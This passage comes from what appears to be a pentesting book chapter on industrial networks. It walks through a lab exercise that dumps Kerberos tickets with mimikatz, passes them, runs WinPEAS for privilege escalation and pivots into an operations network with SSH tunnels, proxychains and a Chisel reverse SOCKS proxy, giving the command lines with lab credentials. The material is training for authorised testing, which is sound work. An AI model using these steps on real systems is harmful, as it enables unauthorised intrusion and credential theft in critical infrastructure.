				<li>With that, you have seen how easy it is to dump credentials. Now, we will learn how easy it is to use mimikatz to dump tickets. We are going to set the <strong class="source-inline">Command</strong> option to <strong class="source-inline">sekurlsa::tickets /export</strong> and then type the command <strong class="source-inline">run</strong>. The <strong class="source-inline">/export</strong> object tells the module to export tickets as <strong class="source-inline">.kirbi</strong> files. We can then use these tickets to perform more advanced attacks such as PTT. A Golden Ticket is a <a id="_idIndexMarker790"/>reference to a ticket that grants a user domain admin access. Kerberos is widely used, which makes it an excellent attack surface and because it is so widely used, attackers have found ways to exploit it. So, to take a look at how easy it is to capture tickets, we will set <strong class="source-inline">Command</strong> to <strong class="source-inline">sekurlsa::tickets /export</strong> for the <strong class="source-inline">mimikatz</strong> module and then run it. You should see the following output:<div id="_idContainer487" class="IMG---Figure"><img src="image/B16321_11_043.jpg" alt="Figure 11.43 – sekurlsa::tickets&#13;&#10;"/></div><p class="figure-caption">Figure 11.43 – sekurlsa::tickets</p></li>
				<li>On our victim host, you will be able to find the <strong class="source-inline">.kirbi</strong> tickets that were exported from running the <strong class="source-inline">sekurlsa::tickets /export</strong> command, as shown here:<div id="_idContainer488" class="IMG---Figure"><img src="image/B16321_11_044.jpg" alt="Figure 11.44 – .kirbi tickets&#13;&#10;"/></div><p class="figure-caption">Figure 11.44 – .kirbi tickets</p></li>
				<li>Now that we have <strong class="source-inline">.kirbi</strong> tickets, we can utilize <strong class="source-inline">mimikatz.exe</strong> on our victim machine <a id="_idIndexMarker791"/>and use the <strong class="source-inline">kerberos::ptt &lt;ticket&gt;</strong> command, as shown here:<div id="_idContainer489" class="IMG---Figure"><img src="image/B16321_11_045.jpg" alt="Figure 11.45 – kerberos::ptt – pass the ticket&#13;&#10;"/></div><p class="figure-caption">Figure 11.45 – kerberos::ptt – pass the ticket</p></li>
				<li>Now, we can verify that PTT worked by running the <strong class="source-inline">klist</strong> command. This will list the cached tickets on the system, which will let us see if we have successfully impersonated the ticket:<div id="_idContainer490" class="IMG---Figure"><img src="image/B16321_11_046.jpg" alt="Figure 11.46 – Cached tickets&#13;&#10;"/></div><p class="figure-caption">Figure 11.46 – Cached tickets</p></li>
				<li>Next, we are <a id="_idIndexMarker792"/>going to run a module that will perform automatic testing to help find a path to exploit. We will be using the WinPEAS module, which can be found under the <strong class="source-inline">privesc</strong> category. <strong class="bold">Windows Privilege Escalation Awesome Scripts</strong> (<strong class="bold">WinPEAS</strong>) allows us to sit back and let <a id="_idIndexMarker793"/>the programming do its thing. As the various tests run, we can watch as the output hits the screen. The information is color-coded so that we can easily spot potential points of entry. We will see links to hints and tricks for escalating privileges along the way. The following screenshot shows the <strong class="bold">Basic System Information</strong> options that were discovered:</li>
			</ol>
			<div>
				<div id="_idContainer491" class="IMG---Figure">
					<img src="image/B16321_11_047.jpg" alt="Figure 11.47 – WinPEAS Basic System Information&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.47 – WinPEAS Basic System Information</p>
			<p>As we scroll through this information, we will see that WinPEAS has pulled out more useful information regarding the system, such as Network Ifaces and known hosts, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer492" class="IMG---Figure">
					<img src="image/B16321_11_048.jpg" alt="Figure 11.48 – Network Ifaces and known hosts&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.48 – Network Ifaces and known hosts</p>
			<p>Under Ifaces <a id="_idIndexMarker794"/>and known hosts, we can see a list of devices that our victim has communicated with. We can see <strong class="source-inline">Domain Controller</strong> at <strong class="source-inline">.2</strong>, Kali Linux at <strong class="source-inline">.6</strong>, and the firewall that we installed at <strong class="source-inline">.7</strong>. If we continue to scroll through the information that WinPEAS has produced, we will come across a <strong class="source-inline">Saved RDP connections</strong> section, as shown here:</p>
			<div>
				<div id="_idContainer493" class="IMG---Figure">
					<img src="image/B16321_11_049.jpg" alt="Figure 11.49 – Saved RDP connections&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.49 – Saved RDP connections</p>
			<p>The list goes on for discovery. The more we scroll, the more we find, and we will even find the Kerberos tickets that we dumped with mimikatz. Here is an example of the Kerberos ticket discovery process when using WinPEAS:</p>
			<div>
				<div id="_idContainer494" class="IMG---Figure">
					<img src="image/B16321_11_050.jpg" alt="Figure 11.50 – kerberos tickets&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.50 – kerberos tickets</p>
			<p>There are various tools we can use to get the job done. In this section, we explored dumping credentials, dumping tickets, PTT attacks, and running WinPEAS to find a path to privilege <a id="_idIndexMarker795"/>escalation. Working with these techniques and tools is important as every environment is different and each setup and local policy is different. You have to be versatile and comfortable with the tools that you are using to adapt them to your customer's parameters. In the next section, we are going to discuss pivoting through the environment and get deeper and closer to the real critical process.</p>
			<h1 id="_idParaDest-120"><a id="_idTextAnchor136"/>Pivoting</h1>
			<p>One of the most fundamentally important parts of pentesting is pivoting. If you don't take anything else <a id="_idIndexMarker796"/>away from reading this book, make sure that you bake pivoting into your brain. Pivoting is the technique of leveraging a compromised machine to exploit an additional machine that's deeper in the network. Several methods and tools can be used to perform this task. You can use tunneling, proxying, and port forwarding to accomplish this task. We touched on a couple of these methods already, including port forwarding with NAT rules with the pfSense firewall, which we did in this chapter, and proxying with FoxyProxy in <a href="B16321_09_Epub_AM.xhtml#_idTextAnchor106"><em class="italic">Chapter 9</em></a>, <em class="italic">Ninja 308</em>. There are also other tools we can use, such as the following:</p>
			<ul>
				<li>Proxychains</li>
				<li>SSH tunneling and port forwarding</li>
				<li>Chisel</li>
			</ul>
			<p>These tools are what we will use to explore pivoting. We will use these tools to pivot from our Kali host, through our Windows 10 workstation, down to our Windows 7 machine, which is <a id="_idIndexMarker797"/>sitting at the operations and control level of our network. Our approach will follow the red line shown on the following network diagram:</p>
			<div>
				<div id="_idContainer495" class="IMG---Figure">
					<img src="image/B16321_11_051.jpg" alt="Figure 11.51 – Network pivot&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.51 – Network pivot</p>
			<p>To start, we have to make sure that our Windows 10 machine is running OpenSSH Server, which can be installed by going to <strong class="bold">Apps &amp; features</strong> | <strong class="bold">Optional features</strong> | <strong class="bold">Add a feature</strong>:</p>
			<div>
				<div id="_idContainer496" class="IMG---Figure">
					<img src="image/B16321_11_052.jpg" alt="Figure 11.52 – OpenSSH Server&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.52 – OpenSSH Server</p>
			<p>Once installed, you will <a id="_idIndexMarker798"/>need to start <strong class="bold">OpenSSH SSH Server</strong> by going to <strong class="bold">Services Snap-in</strong>, as shown here:</p>
			<div>
				<div id="_idContainer497" class="IMG---Figure">
					<img src="image/B16321_11_053.jpg" alt="Figure 11.53 – OpenSSH SSH Server&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.53 – OpenSSH SSH Server</p>
			<p>This will allow us to perform SSH tunneling and utilize proxychains to pivot through our firewall and down to the Windows 7 host. Once the server is running, we can test the connection by running <strong class="source-inline">ssh</strong> to connect to it from our Kali box. Here, you must use the <strong class="source-inline">ssh operator1@172.16.0.4</strong> command. You see results similar to the following once you've successfully accessed your host:</p>
			<div>
				<div id="_idContainer498" class="IMG---Figure">
					<img src="image/B16321_11_054.jpg" alt="Figure 11.54 – SSH Windows 10&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.54 – SSH Windows 10</p>
			<p>If you were to test using <strong class="source-inline">xfreerdp</strong> to run remote desktop to our Windows 7 box, you would see that it works, and that means our current NAT rule is allowing the entire corp subnet to access the operations network.</p>
			<p>Use the following <a id="_idIndexMarker799"/>command to test your remote connection and NAT rules:</p>
			<p class="source-code">xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7</p>
			<p>You should see that we have access to the remote desktop of Windows 7. We are going to change our NAT access rules to make sure that we are only allowing access from two hosts through the firewall. We will want our domain controller to be sitting at <strong class="source-inline">172.16.0.2</strong>, as well as our Windows 10 host, which can be found at <strong class="source-inline">172.16.0.4</strong>. The following screenshot shows what your new <strong class="bold">Port Forward</strong> NAT rules should look like:</p>
			<div>
				<div id="_idContainer499" class="IMG---Figure">
					<img src="image/B16321_11_055.jpg" alt="Figure 11.55 – NAT rules&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.55 – NAT rules</p>
			<p>Now, go back and test the NAT rules by running <strong class="source-inline">xfreerdp</strong> again. If your rules are working, you should get a connection error, as shown here:</p>
			<div>
				<div id="_idContainer500" class="IMG---Figure">
					<img src="image/B16321_11_056.jpg" alt="Figure 11.56 – Remote connection error&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.56 – Remote connection error</p>
			<p>With our NAT rules in place, we can simulate the pivoting portion of this chapter. We will start by setting up proxychains.</p>
			<h3>Proxychains</h3>
			<p>Proxychains is a program that manages dynamically linking connections and redirects those connections <a id="_idIndexMarker800"/>through SOCKS4a/5 or HTTP proxies. Proxychains is to command-line tools what FoxyProxy is to websites. The ease of use of Proxychains shines when running commands as all you have to do is prepend the start of your command with <strong class="source-inline">proxychains</strong>. An example would be taking the previous test and running it with <strong class="source-inline">proxychains</strong>:</p>
			<p class="source-code">proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7</p>
			<p>Go to <a href="https://github.com/haad/proxychains">https://github.com/haad/proxychains</a> to learn more about <strong class="source-inline">proxychains</strong> if you are interested.</p>
			<p>To configure <strong class="source-inline">proxychains</strong>, we are going to navigate to <strong class="source-inline">/etc/proxychains.conf</strong>, scroll down to the <strong class="source-inline">[ProxyList]</strong> section, and add a new line; that is, <strong class="source-inline">socks5 127.0.0.1 9000</strong>. The port can be any number that you would like to use. Here is the output at the bottom of my file that I am using in my lab:</p>
			<div>
				<div id="_idContainer501" class="IMG---Figure">
					<img src="image/B16321_11_057.jpg" alt="Figure 11.57 – proxychains.conf&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.57 – proxychains.conf</p>
			<p>After configuring <strong class="source-inline">proxychains</strong>, we still need to build a tunnel to leverage the proxy. We will learn how to do this in the next section.</p>
			<h3>SSH tunneling and port forwarding</h3>
			<p>SSH tunneling allows <a id="_idIndexMarker801"/>an attacker to essentially <em class="italic">tunnel</em> a different protocol <a id="_idIndexMarker802"/>through an established SSH session and ultimately evade <strong class="bold">intrusion detection systems</strong> (<strong class="bold">IDS</strong>). This practice is most commonly used in <em class="italic">nix</em> systems, but as <a id="_idIndexMarker803"/>you saw with our Windows 10 host, OpenSSH is a feature that can be enabled by default.</p>
			<p class="callout-heading">Storytime</p>
			<p class="callout">I can't even count the number of times that I have heard in my career, from security managers, that port <strong class="source-inline">22</strong>/SSH is disabled in their environments. Often, they would chuckle, saying that their infrastructure is Windows-based, so SSH doesn't exist in their network. This was true in the corporate segment of the network for a while, especially if the company wasn't using a solution such as SolarWinds that uses SSH to log into every switch, router, gateway, and firewall, but in the industrial segment, a large portion of the <a id="_idIndexMarker804"/>equipment uses SSH. Several industrial security products require SSH to be enabled on equipment for data to be harvested for <strong class="bold">North American Electric Reliability Corporation/Critical Infrastructure Protection</strong> (<strong class="bold">NERC/CIP</strong>) compliance.</p>
			<p>We can create <a id="_idIndexMarker805"/>port forwards with the SSH <strong class="source-inline">-L</strong> switch, which establishes <a id="_idIndexMarker806"/>a link to whatever port you designate. Run the following command:</p>
			<p class="source-code">ssh -L 5555:172.16.0.7:3389 -fn operator1@172.16.0.4</p>
			<p>This will establish a local link between port <strong class="source-inline">5555</strong> and our remote host using port <strong class="source-inline">3389</strong>, which is the remote desktop. We can then use the <strong class="source-inline">-fn</strong> switch to background the shell and not run any commands. Finally, we will use <strong class="source-inline">operator1</strong> to create the tunnel through our Windows 10 workstation, which we know has access to the Windows 7 host. The following diagram shows the communication path that we will be attempting:</p>
			<div>
				<div id="_idContainer502" class="IMG---Figure">
					<img src="image/B16321_11_058.jpg" alt="Figure 11.58 – Port forward&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.58 – Port forward</p>
			<p>Now that we have port forwarding and the SSH tunnel established, we can run the following command:</p>
			<p class="source-code">xfreerdp /u:operator1 /p:Password1 /v:localhost:5555</p>
			<p>This will open a remote desktop session. If you open Wireshark and capture the session, you will see the results of the <em class="italic">tunnel</em> connection, as shown here:</p>
			<div>
				<div id="_idContainer503" class="IMG---Figure">
					<img src="image/B16321_11_059.jpg" alt="Figure 11.59 – SSH tunnel&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.59 – SSH tunnel</p>
			<p>Now that we have covered the general principles of <strong class="source-inline">proxychains</strong> and SSH tunnels, I am going to <a id="_idIndexMarker807"/>combine the two by creating a dynamic tunnel using the SSH <strong class="source-inline">-D</strong> switch. Go ahead and run the following command:</p>
			<p class="source-code">ssh -D 9000 -fN operator1@172.16.0.4</p>
			<p>Very similar <a id="_idIndexMarker808"/>to SSH port forwarding, instead of linking to a dedicated port on a specific host, we can use <strong class="source-inline">-D</strong> to create a proxy. Now, we can run the following command:</p>
			<p class="source-code">proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7</p>
			<p>This will use <strong class="source-inline">proxychains</strong>, along with our SSH tunnel, to open a remote desktop window. I use <strong class="source-inline">proxychains</strong> with dynamic tunneling as it is much easier to set up as you don't have to map every remote port.</p>
			<h3>Chisel</h3>
			<p>Chisel is a tool <a id="_idIndexMarker809"/>written in Go that allows an attacker to create an SSH tunnel between two hosts, independent of the host's SSH software. This is a great tool to use if you get a shell on a Windows host that does not have OpenSSH Server installed. We need to have the dedicated binaries for the system that we are going to compromise. You can download these binaries from <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.6">https://github.com/jpillora/chisel/releases/tag/v1.7.6</a>.</p>
			<p>I grabbed both the <strong class="source-inline">linux_amd64</strong> and <strong class="source-inline">windows_amd64</strong> binaries. We need to get <strong class="source-inline">chisel_windows_amd64</strong> onto our Windows 10 host. I think we have covered multiple ways to do this throughout this book, so I will leave it up to you to get the binary onto the box. Next, we want to set up a Chisel server on our Kali Linux box. This way, we will create a <strong class="bold">reverse socks proxy</strong>. Run the following command:</p>
			<p class="source-code">./chisel server -p 5555 –reverse &amp;</p>
			<p>This will tell Chisel to <a id="_idIndexMarker810"/>create a reverse proxy server listening on port <strong class="source-inline">5555</strong> and run it in the background. If you want to troubleshoot the connection, then simply drop the <strong class="source-inline">&amp;</strong> symbol and run the server. You will see the following results:</p>
			<div>
				<div id="_idContainer504" class="IMG---Figure">
					<img src="image/B16321_11_060.jpg" alt="Figure 11.60 – Chisel server&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.60 – Chisel server</p>
			<p>On our Windows10 host, we want to <a id="_idIndexMarker811"/>run the following <strong class="source-inline">client</strong> command to create the reverse proxy connection:</p>
			<p class="source-code">chisel.exe client 172.16.0.6:5555 R:socks &amp;</p>
			<p>Once again, drop the <strong class="source-inline">&amp;</strong> symbol to troubleshoot the connection. You should see the following output:</p>
			<div>
				<div id="_idContainer505" class="IMG---Figure">
					<img src="image/B16321_11_061.jpg" alt="Figure 11.61 – Reverse proxy&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.61 – Reverse proxy</p>
			<p>As you may have noticed by the last line of output after we ran the <strong class="source-inline">server</strong> command, a reverse socks proxy is listening on port <strong class="source-inline">1080</strong>, as shown here:</p>
			<div>
				<div id="_idContainer506" class="IMG---Figure">
					<img src="image/B16321_11_062.jpg" alt="Figure 11.62 – Reverse proxy listener&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.62 – Reverse proxy listener</p>
			<p>For us to use <strong class="source-inline">proxychains</strong>, we need to change the port in our configuration from <strong class="source-inline">9000</strong>, which we used for SSH tunneling, to <strong class="source-inline">1080</strong>, which Chisel created. Once the port has been created, rerun the <strong class="source-inline">proxychains</strong> command:</p>
			<p class="source-code">proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7</p>
			<p>If everything worked correctly, you should be sitting with an authenticated Windows 7 remote desktop session:</p>
			<div>
				<div id="_idContainer507" class="IMG---Figure">
					<img src="image/B16321_11_063.jpg" alt="Figure 11.63 – Chisel reverse shell with proxychains&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.63 – Chisel reverse shell with proxychains</p>
			<p>As you can see, it is fairly simple to pivot through a trusted workstation, past a firewall, down into the operational network, and onto a workstation with a few short commands. Having a fully <a id="_idIndexMarker812"/>authenticated session allows us to wreak havoc on the operational network if we were so inclined to and if it is part of our rules of engagement. To do this, we used <strong class="source-inline">proxychains</strong>, combined with SSH tunneling, to gain a foothold deeper in the network, but we needed SSH to be present on the Windows 10 host. To get around the requirement of needing SSH to be present and installed, we used Chisel to gain access.</p>
			<p>These techniques only showed the usability of a single hop. Hopefully, the industrial network you land on is fairly flat and this is good enough, but I do know that defense in depth has gained major traction, which means we have to up our game and perform multi-hop pivots. I will leave it up to you to investigate how to use the tools we just tested further to perform multi-hop pivots.</p>
			<h1 id="_idParaDest-121"><a id="_idTextAnchor137"/>Summary</h1>
			<p>Throughout this chapter, we have looked at various tools and techniques for harvesting credentials and tickets. We leveraged the <em class="italic">loot</em> that we captured to escalate our privileges, and then we proceeded to pivot through the firewall that we installed and configured in the first section of this chapter. I know I said it earlier, but I am going to say it again: as my late friend Trevor would say, learning how to pivot is one of the most fundamental skills to develop and practice as a pentester and never forget Smashburger. I am hoping that as you read and worked through this chapter, you gained a better appreciation for why it is so critical to have access to a lab to spin systems up and tear them down, navigate in and around them, and mirror them to replicate your customer's environment. </p>
			<p>Now that we have gone this far and we are on the operational side of the network, in the next chapter, we will be interacting with the physical process by using the user interface of Ignition SCADA and scripting.</p>
		</div>
	</body></html>